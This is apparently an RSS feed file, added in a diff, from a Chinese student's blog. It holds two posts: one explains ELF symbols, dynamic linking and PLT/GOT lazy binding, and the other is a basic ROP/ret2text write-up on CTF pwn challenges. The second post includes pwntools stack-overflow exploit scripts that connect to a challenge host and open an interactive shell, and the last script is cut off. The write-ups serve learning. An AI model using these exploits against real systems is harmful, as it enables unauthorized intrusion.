@@ -1,0 +1,195 @@
+<?xml version="1.0"?>
+<rss version="2.0">
+    <channel>
+        <title>skyの博客 • Posts by &#34;二进制&#34; tag</title>
+        <link>https://3cly.github.io</link>
+        <description>一只菜狗的博客</description>
+        <language>zh-CN</language>
+        <pubDate>Fri, 30 Dec 2022 21:42:08 +0800</pubDate>
+        <lastBuildDate>Fri, 30 Dec 2022 21:42:08 +0800</lastBuildDate>
+        <category>笔记</category>
+        <category>二进制</category>
+        <item>
+            <guid isPermalink="true">https://3cly.github.io/2022/12/30/%E2%80%9CPLT%E8%A1%A8%E4%B8%8EGOT%E8%A1%A8%E3%81%AE%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0%E2%80%9D/</guid>
+            <title>PLT表与GOT表の延迟绑定机制学习</title>
+            <link>https://3cly.github.io/2022/12/30/%E2%80%9CPLT%E8%A1%A8%E4%B8%8EGOT%E8%A1%A8%E3%81%AE%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0%E2%80%9D/</link>
+            <category>二进制</category>
+            <pubDate>Fri, 30 Dec 2022 21:42:08 +0800</pubDate>
+            <description><![CDATA[ &lt;h1 id=&#34;plt表与got表-延迟绑定机制学习&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#plt表与got表-延迟绑定机制学习&#34;&gt;#&lt;/a&gt; PLT 表与 GOT 表 | 延迟绑定机制学习&lt;/h1&gt;
+&lt;h2 id=&#34;前置知识&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#前置知识&#34;&gt;#&lt;/a&gt; 前置知识&lt;/h2&gt;
+&lt;h3 id=&#34;符号及符号表&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#符号及符号表&#34;&gt;#&lt;/a&gt; 符号及符号表&lt;/h3&gt;
+&lt;p&gt;在编程语言中，不可避免的要定义全局变量，函数.&lt;br&gt;
+ 在编译器编译源文件的时候，函数名转换为内存地址的引用，未定义的函数名要分配重定位条目，已初始化且初始化不为 0 变量要存入.data 节，初始化为 0 的存入.bss 节，未初始化的则指向 COMMON 伪节中.&lt;br&gt;
+ 执行这些操作，需要一个合适的数据结构以组织这些信息和高效的获取数据。于是这一个个的函数名和全局变量名就称为符号，并有序的组织在一起，称为符号表.&lt;/p&gt;
+&lt;p&gt;这里做个测试&lt;img data-src=&#34;/images/QQ%E5%9B%BE%E7%89%8720221230203518.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/images/QQ%E5%9B%BE%E7%89%8720221230203826.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;首先我们来看符号 main 和 func。在源程序中定义了两个函数，分别是函数 main 和函数 func，所以符号表中二者的类型是函数。又函数 main 和 func 是全局可见的，因此这里的 Bind 字段也是全局的 (GLOBAL)。关于 Ndx 表示的是 section 的索引值。关于索引值与具体 section 的对应关系，可以查看 section header table 来确定&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/images/QQ%E5%9B%BE%E7%89%8720221230204054.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;又函数 main 和 func 所在的位置是 text section, 所以这里符号 main 和 func 的 Ndx 为 2&lt;/p&gt;
+&lt;p&gt;Value (16 进制) 表示函数相对于.text section 起始位置的偏移量 Size 表示所占字节数 由图知函数 func 是从 0 开始，大小是 46 个字节 所以函数 main 的起始地址是 0x2e (46), 紧跟在函数 func 之后 字段 Vis 在 C 语言中没有使用 我们可以忽略这个字段&lt;/p&gt;
+&lt;p&gt;关于符号 printf 虽然他也是个函数 但是函数 printf 只是在 main.c 中被引用，由于它的定义并不在 main.c 中，所以它的 Ndx 是 UND (undefine) 的类型&lt;/p&gt;
+&lt;p&gt;关于全局变量 count 和 value, 符号表中类型是 OBJECT 表明该符号是个数据对象 (变量和数组等在符号表中的类型都用 OBJECT 来表示) 虽然二者都是全局变量 但二者 Ndx 值不同也就是说二者处于不同的 section 中 导致二者位于不同 section 的原因是 count 经过了初始化，而 value 没有&lt;/p&gt;
+&lt;p&gt;main.c 中还定义了一个局部变量 x 这个局部变量没有出现在符号表中，这是因为局部变量在运行时是在栈中被管理，链接器对此类符号并不感兴趣，所以局部变量的信息不会出现在符号表中&lt;/p&gt;
+&lt;h3 id=&#34;动态链接与静态链接&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#动态链接与静态链接&#34;&gt;#&lt;/a&gt; 动态链接与静态链接&lt;/h3&gt;
+&lt;p&gt;关于动态链接与静态链接，大佬打了个比方：如果我的文章引用了别人的一部分文字，在我发布文章的时候把别人的段落复制到我的文章里面就属于静态连接，而做一个超链接让你们自己去看就属于动态链接了&lt;/p&gt;
+&lt;h4 id=&#34;静态链接&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#静态链接&#34;&gt;#&lt;/a&gt; 静态链接&lt;/h4&gt;
+&lt;p&gt;一段代码从文本编辑器上产生到最终能够在机器上运行，经历了非常多的阶段，概括而言，至少包含了以下几个阶段：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;编译：编译器通过词法分析，语法分析，语义分析等，将一段代码翻译成汇编语言&lt;/li&gt;
+&lt;li&gt;汇编：将汇编语言翻译成机器指令&lt;/li&gt;
+&lt;li&gt;链接：解决符号之间的重定位问题&lt;/li&gt;
+&lt;li&gt;装载：将可执行文件加载到内存&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;静态链接就是在装载之前，就完成所有的符号引用的一种链接方式。静态链接的处理过程分为 2 个步骤：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;空间与地址的分配。扫描所有的目标文件，合并相似段，收集当中所有的符号信息。&lt;/li&gt;
+&lt;li&gt;符号解析与重定位。调整代码位置。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;strong&gt;静态链接的优缺点&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;优点： 简单&lt;/li&gt;
+&lt;li&gt;缺点：
+&lt;ul&gt;
+&lt;li&gt;浪费内存空间。在多进程的操作系统下，同一时间，内存中可能存在多个相同的公共库函数。&lt;/li&gt;
+&lt;li&gt;程序的开发与发布流程受模块制约。 只要有一个模块更新，那么就需要重新编译打包整个代码。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;为了解决以上 2 个问题，就诞生了动态链接。&lt;/p&gt;
+&lt;h4 id=&#34;动态链接&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#动态链接&#34;&gt;#&lt;/a&gt; 动态链接&lt;/h4&gt;
+&lt;p&gt;基本思想就是将对符号的重定位推迟到程序运行时才进行。&lt;/p&gt;
+&lt;p&gt;只要推迟到运行时进行符号的重定位，就能解决静态链接的两个缺点。&lt;/p&gt;
+&lt;p&gt;对于第一个缺点：在运行时重定位，如果在运行过程中调用了公共库函数或者其他模块的函数，系统只需要在内存中维护一份公共库代码即可，只要将不同应用程序对公共库函数的调用地址设置成相同即可。&lt;/p&gt;
+&lt;p&gt;对于第二个缺点：理论上只要将需要替换的模块更新，无需将整个应用程序打包。&lt;/p&gt;
+&lt;p&gt;对于静态链接来说，系统只需要加载一个文件（可执行文件）到内存即可，但是在动态链接下，系统需要映射一个主程序和多个动态链接模块，因此，相比于静态链接，动态链接使得内存的空间分布更加复杂。&lt;/p&gt;
+&lt;h2 id=&#34;pltgot&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pltgot&#34;&gt;#&lt;/a&gt; PLT&amp;amp;GOT&lt;/h2&gt;
+&lt;p&gt;linux 下的动态链接是通过 PLT&amp;amp;GOT 来实现的&lt;/p&gt;
+&lt;p&gt;这里来看一个现成的 c 语言编写的还未链接的.o 文件&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/images/QQ%E5%9B%BE%E7%89%8720230101185801.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;printf () 和函数是在 glibc 动态库里面的，只有当程序运行起来的时候才能确定地址，所以此时的 printf () 函数先用 fc ff ff ff 也就是有符号数的 -4 代替&lt;/p&gt;
+&lt;p&gt;运行时进行重定位是无法修改代码段的，只能将 printf 重定位到数据段，但是已经编译好的程序，调用 printf 的时候怎么才能找到这个地址呐？&lt;/p&gt;
+&lt;p&gt;链接器会额外生成一小段代码，通过这段代码来获取 printf () 的地址，像下面这样，进行链接的时候只需要对 printf_stub () 进行重定位操作就可以&lt;/p&gt;
+&lt;figure class=&#34;highlight plain&#34;&gt;&lt;figcaption data-lang=&#34;plain&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;.text&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;...&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;// 调用printf的call指令&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;call printf_stub&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;...&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;printf_stub:&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    mov rax, [printf函数的储存地址] // 获取printf重定位之后的地址&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    jmp rax // 跳过去执行printf函数&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;.data&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;...&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;printf函数的储存地址,这里储存printf函数重定位后的地址&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;总体来说，动态链接每个函数需要两个东西：&lt;/p&gt;
+&lt;p&gt;1、用来存放外部函数地址的数据段&lt;/p&gt;
+&lt;p&gt;2、用来获取数据段记录的外部函数地址的代码&lt;/p&gt;
+&lt;p&gt;对应有两个表，一个用来存放外部的函数地址的数据表称为&lt;strong&gt;全局偏移表&lt;/strong&gt;（&lt;strong&gt;GOT&lt;/strong&gt;, Global Offset Table），那个存放额外代码的表称为&lt;strong&gt;程序链接表&lt;/strong&gt;（&lt;strong&gt;PLT&lt;/strong&gt;，Procedure Link Table）&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/images/1574513788142-e66171f3-6300-4e14-ab57-cc301c936829.jpeg&#34; alt=&#34;image.jpeg&#34;&gt;&lt;/p&gt;
+&lt;p&gt;可执行文件里面保存的是 PLT 表的地址，对应 PLT 地址指向的是 GOT 的地址，GOT 表指向的就是 glibc 中的地址&lt;/p&gt;
+&lt;p&gt;那我们可以发现，在这里面想要通过 plt 表获取函数的地址，首先要保证 got 表已经获取了正确的地址，但是在一开始就进行所有函数的重定位是比较麻烦的，为此，linux 引入了延迟绑定机制&lt;/p&gt;
+&lt;h3 id=&#34;延迟绑定&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#延迟绑定&#34;&gt;#&lt;/a&gt; 延迟绑定&lt;/h3&gt;
+&lt;p&gt;只有动态库函数在被调用时，才会地址解析和重定位工作，为此可以使用类似这样的代码来实现：&lt;/p&gt;
+&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// 一开始没有重定位的时候将 printf@got 填成 lookup_printf 的地址&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;void&lt;/span&gt; printf@&lt;span class=&#34;token function&#34;&gt;plt&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;address_good&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    jmp &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;printf@got   &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;lookup_printf&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    调用重定位函数查找 printf 地址，并写到 printf@got&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token keyword&#34;&gt;goto&lt;/span&gt; address_good&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;// 再返回去执行 address_good&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;说明一下这段代码工作流程，一开始，printf@got 是 lookup_printf 函数的地址，这个函数用来寻找 printf () 的地址，然后写入 printf@got，lookup_printf 执行完成后会返回到 address_good，这样再 jmp 的话就可以直接跳到 printf 来执行了&lt;/p&gt;
+&lt;p&gt;也就是说这样的机制的话如果不知道 printf 的地址，就去找一下，知道的话就直接去 jmp 执行 printf 了&lt;/p&gt;
+&lt;p&gt;关于这个怎么找的笔记因为测试时候忘记截图了就没贴上来了 下面说些结论&lt;/p&gt;
+&lt;p&gt;在想要调用的函数没有被调用过，想要调用他的时候，是按照这个过程来调用的&lt;/p&gt;
+&lt;p&gt;xxx@plt -&amp;gt; xxx@got -&amp;gt; xxx@plt -&amp;gt; 公共 @plt -&amp;gt; _dl_runtime_resolve&lt;/p&gt;
+&lt;p&gt;在 i386 架构下，除了每个函数占用一个 GOT 表项外，GOT 表项还保留了３个公共表项，也即 got 的前３项，分别保存：&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;got [0]: 本 ELF 动态段 (.dynamic 段）的装载地址&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;got [1]：本 ELF 的 link_map 数据结构描述符地址&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;got [2]：_dl_runtime_resolve 函数的地址&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;动态链接器在加载完 ELF 之后，都会将这３地址写到 GOT 表的前３项&lt;/p&gt;
+&lt;p&gt;流程图:&lt;/p&gt;
+&lt;p&gt;第一次调用:&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/images/1580739542097-a6d2738b-9a08-4b5f-acd8-d5f2c4d77278.jpeg&#34; alt=&#34;image.jpeg&#34;&gt;&lt;/p&gt;
+&lt;p&gt;之后再次调用:&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/images/1580739570228-64997692-8003-4c10-acf2-2c8d91095e3c.jpeg&#34; alt=&#34;image.jpeg&#34;&gt;&lt;/p&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">https://3cly.github.io/2022/12/15/%E5%9F%BA%E6%9C%ACROP%E5%AD%A6%E4%B9%A0/</guid>
+            <title>基本ROP学习</title>
+            <link>https://3cly.github.io/2022/12/15/%E5%9F%BA%E6%9C%ACROP%E5%AD%A6%E4%B9%A0/</link>
+            <category>二进制</category>
+            <pubDate>Thu, 15 Dec 2022 21:12:06 +0800</pubDate>
+            <description><![CDATA[ &lt;p&gt;用 p64 () 发送数据时，是发送的字节流，也就是比特流（二进制流）。&lt;/p&gt;
+&lt;h1 id=&#34;基本-rop学习&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#基本-rop学习&#34;&gt;#&lt;/a&gt; 基本 ROP 学习&lt;/h1&gt;
+&lt;p&gt;背景：NX 保护的开启 (No-eXecute, 不可执行保护）&lt;/p&gt;
+&lt;p&gt;核心思想：栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。&lt;/p&gt;
+&lt;p&gt;ROP 攻击一般得满足如下条件:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;程序存在溢出，并且可以控制返回地址。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;可以找到满足条件的 gadgets 以及相应 gadgets 的地址。&lt;/p&gt;
+&lt;h2 id=&#34;ret2text&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ret2text&#34;&gt;#&lt;/a&gt; ret2text&lt;/h2&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;ret2text 即控制程序执行程序本身已有的的代码 (.text)。&lt;/p&gt;
+&lt;h3 id=&#34;pwn1_1&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pwn1_1&#34;&gt;#&lt;/a&gt; pwn1_1&lt;/h3&gt;
+&lt;p&gt;&lt;img data-src=&#34;/images/QQ%E5%9B%BE%E7%89%8720221220132950.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;只开了 nx 保护&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;read()&lt;/code&gt;  函数读的数据长度比输入的字符 &lt;code&gt;&amp;amp;buf&lt;/code&gt;  的长度长，能够造成溢出&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/images/QQ%E5%9B%BE%E7%89%8720221215211911.png&#34; alt=&#34;image.png&#34;&gt;&lt;br&gt;
+&lt;img data-src=&#34;/images/QQ%E5%9B%BE%E7%89%8720221215212110.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;发现后门函数&lt;/p&gt;
+&lt;p&gt;利用 ida 计算偏移量&lt;/p&gt;
+&lt;p&gt;用返回地址减去起始地址求得偏移量，这里 buf 相对于返回地址得偏移量为 0x18&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/images/QQ%E5%9B%BE%E7%89%8720221220135857.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;exp 直通后门&lt;/p&gt;
+&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# coding=utf-8&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;remote&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;gxh191.top&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;25537&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;sh_addr&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x40119E&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;payload&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;b&#34;a&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x18&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;sh_addr&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recv&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendline&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;payload&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;interactive&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;/images/QQ%E5%9B%BE%E7%89%8720221215212337.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;pwn2_1&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pwn2_1&#34;&gt;#&lt;/a&gt; pwn2_1&lt;/h3&gt;
+&lt;p&gt;先 checksec 查看保护  只开了 nx 保护&lt;br&gt;
+&lt;img data-src=&#34;/images/QQ%E5%9B%BE%E7%89%8720221215212443.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/images/QQ%E5%9B%BE%E7%89%8720221215212710.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;也是栈溢出   read 函数 读 buf 大小 0x1000&lt;br&gt;
+ 但是多了个 if 和 strlen 需要用 \0 来控制字符串长度避免 exit 了&lt;br&gt;
+这是因为 strlen 遇到 \0 会停止读取，在写脚本时将填充 buf 的字符换成’\0’即可绕过 strlen 的限制&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/images/QQ%E5%9B%BE%E7%89%8720221220133554.png&#34; alt=&#34;image.png&#34;&gt;&lt;br&gt;
+&lt;img data-src=&#34;/images/QQ%E5%9B%BE%E7%89%8720221215212829.png&#34; alt=&#34;image.png&#34;&gt;&lt;br&gt;
+&lt;img data-src=&#34;/images/QQ%E5%9B%BE%E7%89%8720221215212857.png&#34; alt=&#34;image.png&#34;&gt;&lt;br&gt;
+ 直接跳转到 b4ckd00r 函数会退出运行。因此 2-1 并不能像 1-1 一样直接跳转到 b4ckd00r 就行了 而是需要通过栈溢出跳转到 path&lt;br&gt;
+ 脚本如下&lt;/p&gt;
+&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;context&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;arch &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;amd64&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; os &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;linux&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;remote&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;gxh191.top&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;25540&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;payload&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;b&#39;\0&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x4011EF&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendline&lt;span class=&#34;token 